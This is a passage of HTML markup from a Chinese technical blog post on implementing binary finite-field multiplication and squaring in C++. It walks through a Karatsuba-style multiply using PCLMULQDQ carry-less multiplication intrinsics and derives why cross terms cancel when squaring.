class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">(</mo><msub><mi>b</mi><mn>1</mn></msub><mo>+</mo><msub><mi>b</mi><mn>0</mn></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(a_1+a_0)(b_1+b_0)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></li>\n</ul>\n<p>这里我的变量命名  <code>a0xb0</code>  表示 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>×</mo><msub><mi>b</mi><mn>0</mn></msub></mrow><annotation encoding=\"application/x-tex\">a_{0}\\times b_{0}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.73333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>， <code>a0a1xb0b1</code>  表示 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>0</mn></msub><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo><mo>×</mo><mo stretchy=\"false\">(</mo><msub><mi>b</mi><mn>0</mn></msub><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(a_{0}+a_{1})\\times(b_{0}+b_{1})</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span>。我的实现如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// c = a * b</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gf_mul</span><span class=\"params\">(<span class=\"type\">uint64_t</span> c[<span class=\"number\">3</span>], <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> a[<span class=\"number\">3</span>], <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> b[<span class=\"number\">3</span>])</span></span>&#123;</span><br><span class=\"line\">    __m128i a0xb0 = _mm_clmulepi64_si128( _mm_set_epi64x(<span class=\"number\">0</span>, a_&#123;<span class=\"number\">0</span>&#125;),  _mm_set_epi64x(<span class=\"number\">0</span>, b_&#123;<span class=\"number\">0</span>&#125;), <span class=\"number\">0</span>);</span><br><span class=\"line\">    __m128i a1xb1 = _mm_clmulepi64_si128( _mm_set_epi64x(<span class=\"number\">0</span>, a_&#123;<span class=\"number\">1</span>&#125;),  _mm_set_epi64x(<span class=\"number\">0</span>, b_&#123;<span class=\"number\">1</span>&#125;), <span class=\"number\">0</span>);</span><br><span class=\"line\">    __m128i a2xb2 = _mm_clmulepi64_si128( _mm_set_epi64x(<span class=\"number\">0</span>, a_&#123;<span class=\"number\">2</span>&#125;),  _mm_set_epi64x(<span class=\"number\">0</span>, b_&#123;<span class=\"number\">2</span>&#125;), <span class=\"number\">0</span>);</span><br><span class=\"line\">    __m128i a0a1xb0b1 = _mm_clmulepi64_si128( _mm_set_epi64x(<span class=\"number\">0</span>, a_&#123;<span class=\"number\">0</span>&#125; ^ a_&#123;<span class=\"number\">1</span>&#125;),  _mm_set_epi64x(<span class=\"number\">0</span>, b_&#123;<span class=\"number\">0</span>&#125; ^ b_&#123;<span class=\"number\">1</span>&#125;), <span class=\"number\">0</span>);</span><br><span class=\"line\">    __m128i a0a2xb0b2 = _mm_clmulepi64_si128( _mm_set_epi64x(<span class=\"number\">0</span>, a_&#123;<span class=\"number\">0</span>&#125; ^ a_&#123;<span class=\"number\">2</span>&#125;),  _mm_set_epi64x(<span class=\"number\">0</span>, b_&#123;<span class=\"number\">0</span>&#125; ^ b_&#123;<span class=\"number\">2</span>&#125;), <span class=\"number\">0</span>);</span><br><span class=\"line\">    __m128i a1a2xb1b2 = _mm_clmulepi64_si128( _mm_set_epi64x(<span class=\"number\">0</span>, a_&#123;<span class=\"number\">1</span>&#125; ^ a_&#123;<span class=\"number\">2</span>&#125;),  _mm_set_epi64x(<span class=\"number\">0</span>, b_&#123;<span class=\"number\">1</span>&#125; ^ b_&#123;<span class=\"number\">2</span>&#125;), <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> e[<span class=\"number\">5</span>] = &#123;</span><br><span class=\"line\">        (<span class=\"type\">uint64_t</span>) _mm_cvtsi128_si64(a0xb0),</span><br><span class=\"line\">        (<span class=\"type\">uint64_t</span>) _mm_cvtsi128_si64(a0xb0) ^ _mm_cvtsi128_si64(a1xb1) ^ _mm_cvtsi128_si64(a0a1xb0b1),</span><br><span class=\"line\">        (<span class=\"type\">uint64_t</span>) _mm_cvtsi128_si64(a0xb0) ^ _mm_cvtsi128_si64(a1xb1) ^ _mm_cvtsi128_si64(a2xb2) ^ _mm_cvtsi128_si64(a0a2xb0b2),</span><br><span class=\"line\">        (<span class=\"type\">uint64_t</span>) _mm_cvtsi128_si64(a1xb1) ^ _mm_cvtsi128_si64(a2xb2) ^ _mm_cvtsi128_si64(a1a2xb1b2),</span><br><span class=\"line\">        (<span class=\"type\">uint64_t</span>) _mm_cvtsi128_si64(a2xb2),</span><br><span class=\"line\">        <span class=\"comment\">// 0</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    e[<span class=\"number\">1</span>] ^= (<span class=\"type\">uint64_t</span>) _mm_extract_epi64(a0xb0, <span class=\"number\">1</span>),</span><br><span class=\"line\">    e[<span class=\"number\">2</span>] ^= (<span class=\"type\">uint64_t</span>) _mm_extract_epi64(a0xb0, <span class=\"number\">1</span>) ^ _mm_extract_epi64(a1xb1, <span class=\"number\">1</span>) ^ _mm_extract_epi64(a0a1xb0b1, <span class=\"number\">1</span>),</span><br><span class=\"line\">    e[<span class=\"number\">3</span>] ^= (<span class=\"type\">uint64_t</span>) _mm_extract_epi64(a0xb0, <span class=\"number\">1</span>) ^ _mm_extract_epi64(a1xb1, <span class=\"number\">1</span>) ^ _mm_extract_epi64(a2xb2, <span class=\"number\">1</span>) ^ _mm_extract_epi64(a0a2xb0b2, <span class=\"number\">1</span>),</span><br><span class=\"line\">    e[<span class=\"number\">4</span>] ^= (<span class=\"type\">uint64_t</span>) _mm_extract_epi64(a1xb1, <span class=\"number\">1</span>) ^ _mm_extract_epi64(a2xb2, <span class=\"number\">1</span>) ^ _mm_extract_epi64(a1a2xb1b2, <span class=\"number\">1</span>),</span><br><span class=\"line\">    <span class=\"comment\">// e[5] ^= _mm_extract_epi64(a2xb2, 1),</span></span><br><span class=\"line\">    <span class=\"built_in\">gf_mod</span>(c, e);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>本来分组乘法，按照我上一个实现，应该需要 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mo stretchy=\"false\">[</mo><mn>6</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">e[6]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mopen\">[</span><span class=\"mord\">6</span><span class=\"mclose\">]</span></span></span></span> 即 6 个  <code>uint64_t</code>  存储的，但是异或 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>e</mi><mn>5</mn></msub><mo>=</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>2</mn></msub><mo>×</mo><msub><mi>b</mi><mn>2</mn></msub><msub><mo stretchy=\"false\">)</mo><mtext>high 64 bits</mtext></msub></mrow><annotation encoding=\"application/x-tex\">e_5=(a_2\\times b_2)_{\\text{high 64 bits}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.036108em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord text mtight\"><span class=\"mord mtight\">high 64 bits</span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 是不需要的，这一部分一定是 0，在这个实现中不必再保留它，所以被定义为了 5 个  <code>uint64_t</code> 。上面两行注释代表了这个被省略的第 6 个  <code>uint64_t</code> 。</p>\n<p>然而，这里的优化并没有使我的程序变快，甚至会变慢，因为 PCLMULQDQ 指令的乘法本身就已经足够快了，即使减少了 3 个乘法，增加的大量赋值、异或运算开销已经抵消了 3 个乘法的优化，甚至拖慢了程序。</p>\n<h1 id=\"平方\"><a class=\"anchor\" href=\"#平方\">#</a> 平方</h1>\n<h2 id=\"trival-4\"><a class=\"anchor\" href=\"#trival-4\">#</a> Trival</h2>\n<p>Trival 的做法就是复用乘法的实现，调用乘法运算即可：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// c = a^2</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gf_pow2</span><span class=\"params\">(<span class=\"type\">uint64_t</span> c[<span class=\"number\">3</span>], <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> a[<span class=\"number\">3</span>])</span></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">gf_mul</span>(c, a, a);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pclmulqdq-优化-2\"><a class=\"anchor\" href=\"#pclmulqdq-优化-2\">#</a> PCLMULQDQ 优化</h2>\n<p>在乘法运算 PCLMULQDQ 实现的基础上，会发现平方运算中，分组乘法有一些项是会在模 2 加法运算下被 “抵消” 的，可以干脆不算：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mi>a</mi><mo>×</mo><mi>a</mi><mo>=</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>2</mn></msub><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>M</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mo stretchy=\"false\">)</mo><mo>×</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>2</mn></msub><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>M</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mo lspace=\"0em\" rspace=\"0em\">=</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>a</mi><mn>2</mn></msub><msub><mi>a</mi><mn>2</mn></msub><msup><mi>M</mi><mn>4</mn></msup><mo>+</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>2</mn></msub><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>a</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo><msup><mi>M</mi><mn>3</mn></msup><mo>+</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>2</mn></msub><msub><mi>a</mi><mn>0</mn></msub><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>a</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><mo stretchy=\"false\">(</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>a</mi><mn>0</mn></msub><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><msub><mi>a</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo><mi>M</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><msub><mi>a</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mo lspace=\"0em\" rspace=\"0em\">=</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msubsup><mi>a</mi><mn>2</mn><mn>2</mn></msubsup><msup><mi>M</mi><mn>4</mn></msup><mo>+</mo><msubsup><mi>a</mi><mn>1</mn><mn>2</mn></msubsup><msup><mi>M</mi><mn>2</mn></msup><mo>+</mo><msubsup><mi>a</mi><mn>0</mn><mn>2</mn></msubsup></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\na\\times a=&amp;(a_{2}M^{2}+a_{1}M+a_{0})\\times(a_{2}M^{2}+a_{1}M+a_{0})\\\\\n=&amp;a_2a_2M^4+(a_2a_1+a_1a_2)M^3+(a_2a_0+a_0a_2+a_1a_1)M^2+(a_1a_0+a_0a_1)M+a_0a_0\\\\\n=&amp;a_2^2M^4+a_1^2M^2+a_0^2\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:4.572324em;vertical-align:-2.036162em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.536162em;\"><span style=\"top:-4.672054em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span><span style=\"top:-3.147946em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mrel\">=</span></span></span><span style=\"top:-1.6238380000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mrel\">=</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.036162em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.536162em;\"><span style=\"top:-4.672054em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span 